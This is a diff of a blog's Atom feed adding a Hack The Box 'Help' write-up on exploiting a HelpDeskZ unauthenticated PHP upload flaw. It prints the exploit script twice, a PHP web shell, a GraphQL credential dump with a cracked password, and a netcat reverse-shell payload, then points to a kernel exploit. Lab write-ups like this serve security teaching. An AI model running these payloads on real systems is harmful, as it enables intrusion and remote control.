@@ -1,4 +1,514 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-06-01T15:21:09+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Sizzle</title><link href="http://localhost:4000/hack-the-box/sizzle/" rel="alternate" type="text/html" title="Hack The Box - Sizzle" /><published>2019-06-01T00:00:00+02:00</published><updated>2019-06-01T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/sizzle</id><content type="html" xml:base="http://localhost:4000/hack-the-box/sizzle/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-06-08T13:34:21+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Help</title><link href="http://localhost:4000/hack-the-box/help/" rel="alternate" type="text/html" title="Hack The Box - Help" /><published>2019-06-08T00:00:00+02:00</published><updated>2019-06-08T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/help</id><content type="html" xml:base="http://localhost:4000/hack-the-box/help/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-today-help-retired-and-heres-my-write-up-about-it-help-was-a-nice-easy-machine-i-dont-really-have-much-to-say-about-it-to-get-an-initial-shell-on-the-box-we-will-exploit-a-non-authenticated-file-upload-vulnerability-in-a-web-application-called-helpdeskz-this-vulnerability-could-be-exploited-in-two-ways-either-by-editing-the-exploit-to-include-a-higher-range-or-by-getting-credentials-to-the-web-app-and-editing-some-settings-to-make-the-exploit-work-after-getting-a-shell-the-privilege-escalation-part-is-just-a-kernel-exploit-its-a-linux-box-and-its-ip-is-101010121-i-added-it-to-etchosts-as-helphtb-lets-jump-right-in-&quot;&gt;Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDeskZ&lt;/code&gt;. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.121&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;help.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC help.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/help/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-got-ssh-on-port-22-and-http-on-two-ports--80-and-3000-whats-running-on-port-80-is-an-apache2-server-and-on-port-3000-is-nodejs-express-framework&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22 and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on two ports : 80 and 3000. What’s running on port 80 is an &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache2&lt;/code&gt; server and on port 3000 is &lt;code class=&quot;highlighter-rouge&quot;&gt;Node.js Express Framework&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
+&lt;h4 id=&quot;on-port-80-theres-just-the-default-apache-index-page-&quot;&gt;On port 80 there’s just the default &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache&lt;/code&gt; index page :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-i-ran-gobuster-and-got-these-results-&quot;&gt;So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and got these results :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://help.htb/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/06/07 13:03:25 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/index.html (Status: 200)
+/javascript (Status: 301)
+/server-status (Status: 403)
+/support (Status: 301)
+=====================================================
+2019/06/07 13:05:25 Finished
+=====================================================
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-went-to-support-and-there-was-a-web-application-called-helpdeskz-&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/support&lt;/code&gt; and there was a web application called &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDeskZ&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;file-upload-vulnerability&quot;&gt;File Upload Vulnerability&lt;/h3&gt;
+&lt;h4 id=&quot;a-quick-search-and-i-found-an-unauthenticated-file-upload-vulnerability-that-takes-advantage-of-the-weak-file-renaming-function-thats-responsible-for-renaming-tickets-attachments-and-the-ability-to-upload-php-files-because-they-are-allowed-by-default&quot;&gt;A quick search and I found an &lt;a href=&quot;https://www.exploit-db.com/exploits/40300&quot;&gt;unauthenticated file upload vulnerability&lt;/a&gt; that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; files because they are allowed by default.&lt;/h4&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;HelpDeskZ = v1.0.2 suffers from an unauthenticated shell upload vulnerability.
+The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file. -&lt;a href=&quot;https://www.exploit-db.com/exploits/40300&quot;&gt;exploit-db&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;i-wanted-to-test-if-i-can-really-upload-php-so-i-went-to-submit-a-ticket-and-i-attached-a-test-file-&quot;&gt;I wanted to test if I can really upload &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; so I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;Submit a Ticket&lt;/code&gt; and I attached a test file :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/help/5.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/help/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-i-got-file-is-not-allowed&quot;&gt;And I got &lt;code class=&quot;highlighter-rouge&quot;&gt;File is not allowed.&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;luckily-helpdeskz-is-an-open-source-application-so-i-checked-the-source-on-github&quot;&gt;Luckily &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDeskZ&lt;/code&gt; is an open-source application so I checked the source on &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0&quot;&gt;github&lt;/a&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;the-script-that-handles-tickets-submissions-is-called-new-ticketphp-it-can-be-found-in-includesparser&quot;&gt;The script that handles tickets submissions is called &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/parser/new_ticket.php&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;new-ticket.php&lt;/code&gt;&lt;/a&gt;. It can be found in &lt;code class=&quot;highlighter-rouge&quot;&gt;includes/parser&lt;/code&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;heres-the-part-for-the-attachments-&quot;&gt;Here’s the part for the attachments :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(is_array($attachments)){
+		$save_dir = UPLOAD_DIR;
+		foreach($attachments as $attachment) {
+		  // get the attachment name
+		  $filename = $attachment-&amp;gt;filename;
+		  // write the file to the directory you want to save it in
+		  if ($fp = fopen($save_dir.$filename, 'w')) {
+			while($bytes = $attachment-&amp;gt;read()) {
+			  fwrite($fp, $bytes);
+			}
+			fclose($fp);
+		  }
+			
+		  $filesize = @filesize(UPLOAD_DIR.$filename);
+		  if($filesize){
+			  $fileinfo = array('name' =&amp;gt; $filename, 'size' =&amp;gt; $filesize);
+			  $fileverification = verifyAttachment($fileinfo);
+			  if($fileverification['msg_code'] == 0){
+				$ext = pathinfo($filename, PATHINFO_EXTENSION);
+				$filename_encoded = md5($filename.time()).&quot;.&quot;.$ext;
+				$data = array('name' =&amp;gt; $filename, 'enc' =&amp;gt; $filename_encoded, 'filesize' =&amp;gt; $filesize, 'ticket_id' =&amp;gt; $ticketid, 'msg_id' =&amp;gt; $message_id, 'filetype' =&amp;gt; $attachment-&amp;gt;content_type);
+				$db-&amp;gt;insert(TABLE_PREFIX.&quot;attachments&quot;, $data);
+				rename(UPLOAD_DIR.$filename, UPLOAD_DIR.'tickets/'.$filename_encoded);
+			  }else{
+				unlink(UPLOAD_DIR.$filename);
+			  }
+		  }
+		}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;it-takes-the-file-and-uploads-it-then-theres-an-if-statement-that-checks-the-result-of-passing-fileinfo-to-a-function-called-verifyattachment-if-the-function-returned-0-it-will-rename-the-file-if-its-not-0-it-will-delete-the-file-unlinkupload_dirfilename--this-function-can-be-found-in-functionsphp-in-includes&quot;&gt;It takes the file and uploads it then there’s an &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement that checks the result of passing &lt;code class=&quot;highlighter-rouge&quot;&gt;$fileinfo&lt;/code&gt; to a function called &lt;code class=&quot;highlighter-rouge&quot;&gt;verifyAttachment&lt;/code&gt;. If the function returned &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; it will rename the file. If it’s not &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; it will delete the file (&lt;code class=&quot;highlighter-rouge&quot;&gt;unlink(UPLOAD_DIR.$filename)&lt;/code&gt;) . This function can be found in &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/functions.php&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;functions.php&lt;/code&gt;&lt;/a&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;includes/&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;verifyAttachment()&lt;/code&gt; :
+&lt;img src=&quot;/images/hackthebox/help/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function verifyAttachment($filename){
+	global $db;	
+	$namepart = explode('.', $filename['name']);
+	$totalparts = count($namepart)-1;
+	$file_extension = $namepart[$totalparts];
+	if(!ctype_alnum($file_extension)){
+		$msg_code = 1;
+	}else{
+		$filetype = $db-&amp;gt;fetchRow(&quot;SELECT count(id) AS total, size FROM &quot;.TABLE_PREFIX.&quot;file_types WHERE type='&quot;.$db-&amp;gt;real_escape_string($file_extension).&quot;'&quot;);
+		if($filetype['total'] == 0){
+			$msg_code = 2;
+		}elseif($filename['size'] &amp;gt; $filetype['size'] &amp;amp;&amp;amp; $filetype['size'] &amp;gt; 0){
+			$msg_code = 3;
+			$misc = formatBytes($filetype['size']);
+		}else{	
+			$msg_code = 0;
+		}
+	}
+	$data = array('msg_code' =&amp;gt; $msg_code, 'msg_extra' =&amp;gt; $misc);
+	return $data;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;this-function-runs-several-checks-on-the-file-but-interestingly-it-doesnt-check-for-allowed-file-extensions-this-means-that-if-the-file-passed-these-checks-the-function-will-return-0-and-the-file-will-be-renamed-and-successfully-uploaded-no-matter-whats-the-extension-of-that-file-and-the-message-that-says--file-is-not-allowed-is-meaningless&quot;&gt;This function runs several checks on the file, but interestingly it doesn’t check for allowed file extensions. This means that if the file passed these checks the function will return &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; and the file will be renamed and successfully uploaded no matter what’s the extension of that file and the message that says : &lt;code class=&quot;highlighter-rouge&quot;&gt;File is not allowed.&lt;/code&gt; is meaningless.&lt;/h4&gt;
+&lt;h4 id=&quot;if-we-take-a-look-at-how-the-application-renames-files-it-gets-the-md5-hash-of-the-filename-concatenated-with-the-time-of-upload-then-it-concatenates-that-hash-with-the-original-file-extension-and-thats-how-the-exploit-finds-the-uploaded-file-but-theres-a-small-problem-about-time-running-the-exploit-on-our-box-would-use-our-local-time-if-the-timezone-of-the-web-app-is-different-from-the-timezone-of-our-box-the-exploit-will-fail-to-find-the-file-because-it-will-use-a-wrong-time&quot;&gt;If we take a look at how the application renames files it gets the md5 hash of the filename concatenated with the time of upload then it concatenates that hash with the original file extension. And that’s how the exploit finds the uploaded file. But there’s a small problem about time, running the exploit on our box would use our local time. If the timezone of the web app is different from the timezone of our box the exploit will fail to find the file because it will use a wrong time.&lt;/h4&gt;
+&lt;h4 id=&quot;if-we-take-a-look-at-the-exploit-&quot;&gt;If we take a look at the exploit :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import hashlib
+import time
+import sys
+import requests
+
+print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'
+
+if len(sys.argv) &amp;lt; 3:
+    print &quot;Usage: {} [baseUrl] [nameOfUploadedFile]&quot;.format(sys.argv[0])
+    sys.exit(1)
+
+helpdeskzBaseUrl = sys.argv[1]
+fileName = sys.argv[2]
+
+currentTime = int(time.time())
+
+for x in range(0, 300):
+    plaintext = fileName + str(currentTime - x)
+    md5hash = hashlib.md5(plaintext).hexdigest()
+
+    url = helpdeskzBaseUrl+md5hash+'.php'
+    response = requests.head(url)
+    if response.status_code == 200:
+        print &quot;found!&quot;
+        print url
+        sys.exit(0)
+
+print &quot;Sorry, I did not find anything&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-can-solve-this-problem-by-iterating-over-a-higher-range-than-300--for-x-in-range0-300&quot;&gt;We can solve this problem by iterating over a higher range than 300 : &lt;code class=&quot;highlighter-rouge&quot;&gt;for x in range(0, 300)&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;this-will-make-it-try-different-hashes-according-to-different-times-until-it-finds-the-file-you-can-call-it-a-bruteforce-attack-that-will-be-easy-lets-look-at-another-solution-another-solution-is-to-get-credentials-to-login-to-the-web-app-and-edit-the-timezone-in-the-settings-to-make-it-the-same-as-ours&quot;&gt;This will make it try different hashes according to different times until it finds the file, you can call it a bruteforce attack. That will be easy let’s look at another solution. Another solution is to get credentials to login to the web app and edit the timezone in the settings to make it the same as ours.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nodejs-getting-credentials&quot;&gt;Node.js, Getting Credentials&lt;/h3&gt;
+&lt;h4 id=&quot;we-saw-earlier-that-port-3000-was-open-and-running-nodejs-express-framework-and-we-havent-looked-at-that-yet&quot;&gt;We saw earlier that port 3000 was open and running &lt;code class=&quot;highlighter-rouge&quot;&gt;Node.js Express framework&lt;/code&gt; and we haven’t looked at that yet.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;by-going-to-httphelphtb3000-i-got-this-response-of-a-message-saying--hi-shiv-to-get-access-please-find-the-credentials-with-given-query-i-tried-test-and-got-this-&quot;&gt;By going to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/&lt;/code&gt; I got this response of a message saying : &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;Hi Shiv, To get access please find the credentials with given query&quot;&lt;/code&gt;, I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;/test&lt;/code&gt; and got this :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;tbh-the-next-step-involved-a-lot-of-guessingfuzzing-with-custom-wordlists-and-random-things-based-on-google-searches-about-nodejs-nodejs-queries-and-other-related-stuff-after-a-lot-of-attempts-to-find-something-when-i-tried-graphql-i-got-this-response-&quot;&gt;tbh the next step involved a lot of guessing/fuzzing with custom wordlists and random things based on google searches about &lt;code class=&quot;highlighter-rouge&quot;&gt;node.js&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;node.js&lt;/code&gt; queries and other related stuff. After a lot of attempts to find something when I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;/graphql&lt;/code&gt; I got this response :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-i-added-query--httphelphtb3000graphqlquery-and-got-a-syntax-error-&quot;&gt;So I added &lt;code class=&quot;highlighter-rouge&quot;&gt;?query&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query&lt;/code&gt; and got a syntax error :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;thats-fine-i-tried-requesting-a-query-for-example-user--httphelphtb3000graphqlqueryuser-&quot;&gt;That’s fine, I tried requesting a query, for example &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query={user}&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-says-that-user-must-have-a-selection-of-subfields-so-i-tried-username--httphelphtb3000graphqlqueryuserusername-&quot;&gt;It says that &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; must have a selection of subfields so I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query={user{username}}&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;great-lets-get-the-password--httphelphtb3000graphqlqueryuserpassword-&quot;&gt;Great, let’s get the password : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query={user{password}}&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-used-crackstation-to-crack-the-hash-and-got-this-password-&quot;&gt;I used &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack the hash and got this password :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;5d3c93182bb20f07b994a7f617e99cff&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;godhelpmeplz&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;now-we-have-the-credentials--helpmehelpmecom--godhelpmeplz&quot;&gt;Now we have the credentials : &lt;code class=&quot;highlighter-rouge&quot;&gt;helpme@helpme.com : godhelpmeplz&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;file-upload-exploitation-reverse-shell-and-user-flag&quot;&gt;File Upload Exploitation, Reverse Shell and User Flag&lt;/h3&gt;
+&lt;h4 id=&quot;i-edited-the-path-of-the-uploads-in-the-exploit-instead-of-helpdeskzbaseurlmd5hashphp-i-made-it-helpdeskzbaseurluploadsticketsmd5hashphp-i-got-this-path-from-the-github-repository-exploit-after-edits-&quot;&gt;I edited the path of the uploads in the exploit, instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;helpdeskzBaseUrl+md5hash+'.php'&lt;/code&gt; I made it &lt;code class=&quot;highlighter-rouge&quot;&gt;helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'&lt;/code&gt; (I got this path from the &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0&quot;&gt;github repository&lt;/a&gt;). Exploit after edits :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import hashlib
+import time
+import sys
+import requests
+
+print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'
+
+if len(sys.argv) &amp;lt; 3:
+    print &quot;Usage: {} [baseUrl] [nameOfUploadedFile]&quot;.format(sys.argv[0])
+    sys.exit(1)
+
+helpdeskzBaseUrl = sys.argv[1]
+fileName = sys.argv[2]
+
+currentTime = int(time.time())
+
+for x in range(0, 300):
+    plaintext = fileName + str(currentTime - x)
+    md5hash = hashlib.md5(plaintext).hexdigest()
+
+    url = helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'
+    response = requests.head(url)
+    if response.status_code == 200:
+        print &quot;found!&quot;
+        print url
+        sys.exit(0)
+
+print &quot;Sorry, I did not find anything&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-went-to-the-settings-and-changed-the-timezone-to-the-same-timezone-as-mine-&quot;&gt;I went to the settings and changed the timezone to the same timezone as mine :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-php-file-im-going-to-upload-is-simple-backdoorphp-which-can-be-found-in-usrsharewebshellsphpsimple-backdoorphp-in-kali-&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file I’m going to upload is &lt;code class=&quot;highlighter-rouge&quot;&gt;simple-backdoor.php&lt;/code&gt; which can be found in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/webshells/php/simple-backdoor.php&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;kali&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;
+
+&amp;lt;?php
+
+if(isset($_REQUEST['cmd'])){
+        echo &quot;&amp;lt;pre&amp;gt;&quot;;
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo &quot;&amp;lt;/pre&amp;gt;&quot;;
+        die;
+}
+
+?&amp;gt;
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+
+&amp;lt;!--    http://michaeldaw.org   2006    --&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-submitted-the-ticket-&quot;&gt;I submitted the ticket :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-i-ran-the-exploit-and-it-found-the-file-immediately-&quot;&gt;Then I ran the exploit and it found the file immediately :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python exploit.py http://10.10.10.121/support/ rick.php&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/help/18.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/help/19.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=whoami&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/help/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;its-working-lets-get-a-reverse-shell-i-used-this-payload--rm-tmpfmkfifo-tmpfcat-tmpfbinsh--i-21nc-1010xxxx-1337-tmpf-url-encoded&quot;&gt;It’s working, let’s get a reverse shell, I used this payload : &lt;code class=&quot;highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f&lt;/code&gt; (url encoded)&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/help/21.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/help/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;kernel-exploit-privilege-escalation-and-root-flag&quot;&gt;Kernel Exploit, Privilege Escalation and Root Flag&lt;/h3&gt;
+&lt;h4 id=&quot;privilege-escalation-on-this-machine-was-very-easy-just-a-kernel-exploit-one-of-the-first-things-to-check-after-getting-a-shell-is-the-system-info-&quot;&gt;Privilege escalation on this machine was very easy, just a kernel exploit. One of the first things to check after getting a shell is the system info :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;uname -a&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/help/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;that-kernel-version-is-vulnerable-to-a-local-privilege-escalation-vulnerability-and-theres-an-exploit-published-for-it&quot;&gt;That kernel version is vulnerable to a local privilege escalation vulnerability and there’s an &lt;a href=&quot;https://www.exploit-db.com/exploits/44298&quot;&gt;exploit&lt;/a&gt; published for it.&lt;/h4&gt;
